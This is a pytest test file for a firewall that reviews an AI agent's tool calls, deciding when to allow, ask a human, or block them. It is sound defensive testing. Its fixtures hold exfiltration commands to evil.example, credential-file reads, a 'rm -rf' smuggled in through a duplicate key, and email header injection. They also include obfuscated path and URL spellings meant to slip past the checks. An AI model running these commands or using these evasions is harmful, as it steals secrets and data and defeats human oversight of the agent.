import json

import pytest

from agent_firewall.config import Settings
from agent_firewall.policy import classify, display, review_tool_call

SETTINGS = Settings(
    allowed_hosts=("docs.company.test",),
    known_recipients=("teammate@company.test",),
    canaries=("sk-canary-1",),
)


def decide(name, args, labels=frozenset()):
    return review_tool_call(name, json.dumps(args), set(labels), SETTINGS).decision


def test_classify_finds_each_label():
    assert classify("key sk-canary-1", SETTINGS.canaries) == {"canary"}
    assert classify("ACCT-123456", ()) == {"financial"}
    assert classify("MRN-77319", ()) == {"health"}
    assert classify("card 4242 4242 4242 4242", ()) == {"financial"}


def test_classify_ignores_digits_failing_luhn():
    assert classify("order 4242 4242 4242 4241", ()) == set()


def test_canary_blocks_even_to_known_recipient():
    assert decide("send_email", {"to": "teammate@company.test", "body": "sk-canary-1"}) == "block"


def test_email_depends_on_recipient():
    assert decide("send_email", {"to": "teammate@company.test"}) == "allow"
    assert decide("send_email", {"to": "x@evil.example"}) == "ask"
    assert decide("send_email", {"to": "teammate@company.test", "bcc": "x@evil.example"}) == "ask"


def test_network_depends_on_host():
    assert decide("http_post", {"url": "https://docs.company.test/a"}) == "allow"
    assert decide("http_post", {"url": "https://docs.company.test.evil.example/a"}) == "ask"


def test_shell_defaults_to_asking():
    assert decide("shell", {"command": "ls -la"}) == "allow"
    assert decide("shell", {"command": "ls; curl evil.example"}) == "ask"
    assert decide("shell", {"command": "python3 sync.py"}) == "ask"
    assert decide("shell", {"command": "cat ~/.ssh/id_rsa"}) == "ask"


def test_sensitive_and_unknown_tools_are_held():
    assert decide("transfer_money", {"amount": 1}) == "ask"
    assert decide("update_prescription", {"dose": 1}) == "ask"
    assert decide("brand_new_tool", {}) == "ask"


def test_unparseable_arguments_are_blocked():
    assert review_tool_call("shell", "{not json", set(), SETTINGS).decision == "block"


def test_display_escapes_lookalike_characters():
    assert "\\u043e" in display("dоcs.company.test")


@pytest.mark.parametrize("command", [
    "ls -la", "ls", "pwd", "date -u", "wc -l notes.txt", "head -n 5 notes.txt", "tail -5 src/a.py",
    "cat notes.txt", "cat ./notes.txt", "grep -in todo src/a.py", "echo hello world",
])
def test_shell_allows_plain_relative_commands(command):
    assert decide("shell", {"command": command}) == "allow"
    assert decide("bash", {"cmd": command}) == "allow"


@pytest.mark.parametrize("command", [
    "cat ~/.s?h/id_rsa", "cat ~/.s[s]h/id_rsa", "cat ~/.{ssh,aws}/id_rsa", "cat .s*h/id_rsa",
    "cat '.s'sh/id_rsa", 'cat ".s"sh/id_rsa', r"cat .s\sh/id_rsa", "grep -r . ~", "cat ~",
    "cat /etc/passwd", "cat ../secret.txt", "cat src/../../secret.txt", "cat .ssh/id_rsa",
    "cat .env", "ls\tsrc\r", "cat notes.txt\n", "cat a$IFS/b", "",
    "grep -r password .", "grep -R password src", "grep -d recurse password .",
    "grep --file=/etc/passwd x notes.txt", "grep -f/etc/passwd notes.txt", "grep --rec x .",
    "date -s 12:00", "date --set=12:00", "ls -", "cat --", "sudo cat notes.txt", "cat nкtes.txt",
])
def test_shell_asks_unless_every_token_is_literally_understood(command):
    assert decide("shell", {"command": command}) == "ask"


@pytest.mark.parametrize("args", [
    {"command": "ls -la", "cmd": "python3 evil.py"},
    {"command": "ls -la", "cwd": "/etc"},
    {"command": ["ls", "-la"]},
    {},
])
def test_shell_needs_exactly_one_command_field(args):
    assert decide("shell", args) == "ask"


@pytest.mark.parametrize("raw", [
    r'{"to": "teammate@company.test", "body": "sk-canary-1"}',
    r'{"to": "teammate@company.test", "body": {"deep": ["x", {"y": "sk-canary-1"}]}}',
    r'{"to": "teammate@company.test", "sk-canary-1": "key position"}',
])
def test_json_escaped_canary_is_blocked(raw):
    assert review_tool_call("send_email", raw, set(), SETTINGS).decision == "block"


def test_canary_is_blocked_for_every_tool_after_decoding():
    raw = r'{"note": "sk-canary-1"}'
    assert review_tool_call("brand_new_tool", raw, set(), SETTINGS).decision == "block"


@pytest.mark.parametrize("url", [
    "https://docs.company.test/",
    "http://docs.company.test/a?b=c#d",
    "HTTPS://DOCS.company.test:8443/a",
])
def test_network_allows_unambiguous_urls_on_the_exact_host(url):
    assert decide("http_get", {"url": url}) == "allow"


@pytest.mark.parametrize("url", [
    "https://evil.example\\@docs.company.test/",
    "https://evil.example\\.docs.company.test/",
    "https://user@docs.company.test/",
    "https://docs.company.test:x@evil.example/",
    "https://evil.example@docs.company.test/",
    "https://docs.company.test\t/",
    "https://docs.company.test/ a",
    "https://docs.company.test/\x00",
    "\nhttps://docs.company.test/",
    "ftp://docs.company.test/",
    "file://docs.company.test/etc/passwd",
    "//docs.company.test/",
    "https://sub.docs.company.test/",
    "https://docs.company.test./",
    "https://docs.company.test:notaport/",
    "https://[docs.company.test/",
    "",
])
def test_network_asks_for_anything_ambiguous(url):
    assert decide("http_post", {"url": url}) == "ask"


def test_network_asks_for_non_string_url():
    assert decide("http_post", {"url": ["https://docs.company.test/"]}) == "ask"


def test_ambiguous_url_card_shows_the_whole_url():
    url = "https://evil.example\\@docs.company.test/"
    verdict = review_tool_call("http_post", json.dumps({"url": url}), set(), SETTINGS)
    assert verdict.facts[0] == ("Destination", display(url))


def test_network_card_shows_both_payload_fields():
    args = {"url": "https://evil.example/", "data": "innocent", "body": "stolen"}
    verdict = review_tool_call("http_post", json.dumps(args), set(), SETTINGS)
    assert ("Data", "innocent") in verdict.facts
    assert ("Body", "stolen") in verdict.facts


@pytest.mark.parametrize("name, raw", [
    ("send_email", '{"to": "teammate@company.test", "to": "x@evil.example"}'),
    ("send_email", r'{"to": "teammate@company.test", "to": "x@evil.example"}'),
    ("http_post", '{"url": "https://docs.company.test/", "url": "https://evil.example/"}'),
    ("shell", '{"command": "ls", "command": "rm -rf ."}'),
    ("read_file", '{"path": "a", "path": "b"}'),
    ("transfer_money", '{"amount": 1, "amount": 9}'),
    ("brand_new_tool", '{"a": 1, "a": 2}'),
    ("brand_new_tool", '{"outer": [{"deep": {"a": 1, "a": 2}}]}'),
])
def test_duplicate_keys_are_blocked(name, raw):
    assert review_tool_call(name, raw, set(), SETTINGS).decision == "block"


def test_extremely_nested_arguments_are_blocked():
    raw = '{"a": ' + "[" * 200000 + "]" * 200000 + "}"
    assert review_tool_call("brand_new_tool", raw, set(), SETTINGS).decision == "block"


@pytest.mark.parametrize("name, args", [
    ("send_email", {"to": "teammate@company.test", "reply_to": "x@evil.example"}),
    ("send_email", {"to": "teammate@company.test", "To": "x@evil.example"}),
    ("send_email", {"to": "teammate@company.test", "attachments": ["statement.txt"]}),
    ("http_post", {"url": "https://docs.company.test/", "forward_to": "https://evil.example/"}),
    ("read_file", {"path": "notes.txt", "also": ".ssh/id_rsa"}),
    ("read_file", {"path": "notes.txt", "query": ".ssh/id_rsa"}),
    ("read_file", {"path": ["notes.txt"]}),
])
def test_unknown_or_mismatched_fields_are_held(name, args):
    assert decide(name, args) == "ask"


def test_known_fields_still_auto_allow():
    email = {"to": "teammate@company.test", "cc": "teammate@company.test", "bcc": [], "subject": "s", "body": "b"}
    assert decide("send_email", email) == "allow"
    assert decide("http_post", {"url": "https://docs.company.test/", "data": "d", "body": "b"}) == "allow"
    assert decide("search_files", {"path": "notes", "query": "planning"}) == "allow"
    assert decide("read_inbox", {}) == "allow"


def test_extra_fields_are_shown_on_the_card():
    args = {"to": "teammate@company.test", "reply_to": "x@evil.example"}
    verdict = review_tool_call("send_email", json.dumps(args), set(), SETTINGS)
    assert ("Extra field: reply_to", "x@evil.example") in verdict.facts
    assert "You've never approved this recipient" not in verdict.reasons


def read(path, tool="read_file"):
    return review_tool_call(tool, json.dumps({"path": path}), set(), SETTINGS)


@pytest.mark.parametrize("path", [".ßh/id_ed25519", ".ẞh/id_ed25519", ".ſsh/id_ed25519", "~/.ßh"])
def test_case_folded_spellings_of_protected_paths_are_held_as_credentials(path):
    verdict = read(path)
    assert verdict.decision == "ask"
    assert verdict.title == "Agent wants to read a credentials file"


def test_case_folded_directory_listing_is_held():
    assert read("~/.ßh", tool="list_files").decision == "ask"


@pytest.mark.parametrize("path", [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/master.passwd", "../../../etc/passwd",
    "../../.netrc", "file:///etc/passwd", "/proc/self/environ", "/proc/1/environ",
    "/var/db/dslocal/nodes/Default/users/root.plist", "a/../../b.txt", "/Users/x/report.txt",
    " /etc/passwd", "-rf", "",
])
def test_read_tools_are_confined_to_relative_paths(path):
    assert read(path).decision == "ask"


@pytest.mark.parametrize("args", [
    {"path": "~", "query": "BEGIN OPENSSH PRIVATE KEY"},
    {"path": "/", "query": "password"},
    {"query": "aws_secret_access_key"},
    {"path": ".", "query": "planning"},
    {"path": "./", "query": "planning"},
    {"path": "notes", "query": "BEGIN OPENSSH PRIVATE KEY"},
])
def test_content_search_needs_a_named_confined_root(args):
    assert decide("search_files", args) == "ask"


def test_read_file_needs_a_path():
    assert decide("read_file", {}) == "ask"
    assert decide("read_file", {"path": None}) == "ask"


@pytest.mark.parametrize("path", [
    "~/.s?h/id_ed25519", "~/.s*/id_ed25519", "~/.s[s]h/id_ed25519", "~/.{ssh,foo}/id_ed25519",
    "~/%2Essh/id_ed25519", "~/.s%73h/id_ed25519", "file:///Users/victim/%2Essh/id_ed25519",
    "~/.s\\sh/id_ed25519", "~/．ssh/id_ed25519", ".ss\u0000h/id_ed25519", "id＿rsa",
    "notes?.txt", "notes*.txt", "n%6Ftes.txt", "notes\\a.txt", "nоtes.txt",
])
def test_read_paths_with_any_rewritable_spelling_are_held(path):
    assert read(path).decision == "ask"


def test_glob_directory_listing_is_held():
    assert read("~/.s?h", tool="list_files").decision == "ask"


@pytest.mark.parametrize("path", ["notes.txt", "./notes.txt", "notes/2026/plan-a_b.md", "statement.txt"])
def test_plain_relative_reads_stay_allowed(path):
    assert read(path).decision == "allow"


def test_listing_the_working_directory_stays_allowed():
    assert read(".", tool="list_files").decision == "allow"
    assert decide("list_files", {}) == "allow"


def test_inbox_search_may_use_any_language():
    assert decide("read_inbox", {"query": "café plans"}) == "allow"


@pytest.mark.parametrize("target", [
    ".envrc", ".env_local", ".env2", ".environment", ".env_prod", ".env_production", "app/.env2",
    ".netrc", ".npmrc", ".pypirc", ".pgpass", ".my.cnf", ".git/config", ".docker/config.json",
    ".kube/config", ".config/gh/hosts.yml", ".azure/accessTokens.json",
    ".config/gcloud/access_tokens.db", ".zsh_history", ".some_future_tool/token", "id_ed25519",
    "private.pem", "server.key", "secrets.yaml", "terraform.tfstate",
])
def test_secret_files_beyond_the_old_name_list_are_held(target):
    assert decide("shell", {"command": f"cat {target}"}) == "ask"
    assert read(target).decision == "ask"


@pytest.mark.parametrize("command", ["head -c 4096 .netrc", "grep -H . .netrc", "cat ./.netrc"])
def test_every_file_reading_command_respects_hidden_files(command):
    assert decide("shell", {"command": command}) == "ask"


@pytest.mark.parametrize("path", [
    "~/.netrc", "~/.pgpass", "~/.kube/config", "~/.docker/config.json", "~/.config/gh/hosts.yml",
    "~/id_ed25519", "~/Library/Cookies/Cookies.binarycookies",
    "~/Library/Application Support/Google/Chrome/Default/Login Data",
    "/Users/x/.netrc", "/Users/x/.kube/config", "/Users/x/.pgpass",
    "Library/Cookies/Cookies.binarycookies", "Default/Login Data",
])
def test_home_directory_credential_stores_are_held(path):
    assert read(path).decision == "ask"


@pytest.mark.parametrize("command", [
    "date 0101000099", "date 010100002030.59", "date -u 0101000099", "date 010100002030",
    "date notes",
])
def test_date_operands_are_held_because_they_set_the_clock(command):
    assert decide("shell", {"command": command}) == "ask"


@pytest.mark.parametrize("command", ["date", "date -u", "date +%Y-%m-%d", "date -u +%H:%M"])
def test_date_formats_stay_allowed(command):
    assert decide("shell", {"command": command}) == "allow"


@pytest.mark.parametrize("command", ["ls -aR", "ls -laR .", "ls -R", "ls -R src"])
def test_recursive_listing_is_held(command):
    assert decide("shell", {"command": command}) == "ask"


def workdir_settings(tmp_path):
    (tmp_path / ".ssh").mkdir()
    (tmp_path / ".ssh" / "id_ed25519").write_text("FAKE-PRIVATE-KEY")
    (tmp_path / "plain.txt").write_text("hello")
    (tmp_path / "notes.txt").symlink_to(tmp_path / ".ssh" / "id_ed25519")
    (tmp_path / "out.txt").symlink_to("/etc/hosts")
    (tmp_path / "ok.txt").symlink_to(tmp_path / "plain.txt")
    return Settings(agent_workdir=str(tmp_path))


@pytest.mark.parametrize("target", ["notes.txt", "out.txt"])
def test_symlink_out_of_bounds_is_held_once_the_workdir_is_known(tmp_path, target):
    config = workdir_settings(tmp_path)
    assert review_tool_call("shell", json.dumps({"command": f"cat {target}"}), set(), config).decision == "ask"
    assert review_tool_call("read_file", json.dumps({"path": target}), set(), config).decision == "ask"


@pytest.mark.parametrize("target", ["plain.txt", "ok.txt", "not-there-yet.txt"])
def test_links_inside_the_workdir_stay_allowed(tmp_path, target):
    config = workdir_settings(tmp_path)
    assert review_tool_call("shell", json.dumps({"command": f"cat {target}"}), set(), config).decision == "allow"
    assert review_tool_call("read_file", json.dumps({"path": target}), set(), config).decision == "allow"


NUMERIC = Settings(
    allowed_hosts=("docs.company.test",), known_recipients=("teammate@company.test",),
    canaries=("4111222233334444", "6065551212"),
)


@pytest.mark.parametrize("name, raw", [
    ("send_email", '{"to":"teammate@company.test","body":4.111222233334444e15}'),
    ("send_email", '{"to":"teammate@company.test","body":4.111222233334444E+15}'),
    ("send_email", '{"to":"teammate@company.test","body":41112222.33334444e8}'),
    ("http_post", '{"url":"https://docs.company.test/","data":{"acct":[4.111222233334444E+15]}}'),
    ("http_post", '{"url":"https://docs.company.test/","data":6.065551212e9}'),
])
def test_numeric_canary_is_blocked_in_any_number_spelling(name, raw):
    assert review_tool_call(name, raw, set(), NUMERIC).decision == "block"


def test_enormous_exponent_is_not_expanded():
    raw = '{"to":"teammate@company.test","body":1e999999999}'
    assert review_tool_call("send_email", raw, set(), NUMERIC).decision == "ask"


KNOWN = "teammate@company.test"


@pytest.mark.parametrize("args", [
    {"to": KNOWN, "subject": "hi\r\nBcc: x@evil.example", "body": "b"},
    {"to": KNOWN, "subject": "hi\nBcc: x@evil.example"},
    {"to": KNOWN, "subject": "hi Bcc: x@evil.example"},
    {"to": KNOWN, "body": "a\r\n.\r\nRCPT TO:<x@evil.example>\r\n"},
    {"to": KNOWN, "body": "a\n.\nRCPT TO:<x@evil.example>\n"},
    {"to": KNOWN, "subject": {"bcc": "x@evil.example"}},
    {"to": KNOWN, "body": {"attachments": ["/etc/passwd"], "bcc": "x@evil.example"}},
    {"to": KNOWN, "body": ["a", {"reply_to": "x@evil.example"}]},
])
def test_email_fields_that_could_hide_a_recipient_are_held(args):
    assert decide("send_email", args) == "ask"


def test_multiline_email_body_stays_allowed():
    assert decide("send_email", {"to": KNOWN, "subject": "s", "body": "line one\n\n  - two\tdone\n"}) == "allow"


@pytest.mark.parametrize("key", ["data", "body"])
def test_structured_network_payload_is_held(key):
    args = {"url": "https://docs.company.test/x", key: {"url": "https://evil.example/", "forward_to": "https://evil.example/"}}
    assert decide("http_post", args) == "ask"


@pytest.mark.parametrize("text", [
    "4242 4242 4242 4242 12/28",
    "exp: 4242 4242 4242 4242 123",
    "2025 4242 4242 4242 4242",
    "378282246310005 12/28",
    "4111 1111 1111 1111 123",
    "Card on file: 4111 1111 1111 1111 01/29",
    "4111-1111-1111-1111-01",
])
def test_card_is_found_beside_adjacent_digit_groups(text):
    assert classify(text, ()) == {"financial"}


@pytest.mark.parametrize("name, args, hidden", [
    ("shell", {"command": "echo " + "A" * 230 + " ; python3 steal.py"}, "steal.py"),
    ("export_all_contacts", {"note": "A" * 230, "destination": "https://evil.example/drop"}, "evil.example"),
    ("send_email", {"to": ",".join(["teammate@company.test"] * 12), "bcc": "attacker@evil.example", "subject": "s", "body": "b"}, "attacker@evil.example"),
    ("transfer_money", {"to_account": "Savings " + "A" * 230 + " IBAN-ATTACKER", "amount_usd": 5}, "IBAN-ATTACKER"),
    ("http_post", {"url": "https://new.example/?stolen=ACCT-123456"}, "stolen=ACCT-123456"),
])
def test_approval_card_shows_the_whole_action(name, args, hidden):
    verdict = review_tool_call(name, json.dumps(args), set(), SETTINGS)
    assert verdict.decision == "ask"
    assert any(hidden in value for _, value in verdict.facts)


@pytest.mark.parametrize("name, args", [
    ("shell", {"command": "echo " + "A" * 5000 + " ; python3 steal.py"}),
    ("transfer_money", {"to_account": "A" * 5000, "amount_usd": 5}),
    ("send_email", {"to": "x@evil.example", "body": "A" * 5000}),
])
def test_action_too_long_to_show_in_full_is_blocked(name, args):
    assert review_tool_call(name, json.dumps(args), set(), SETTINGS).decision == "block"
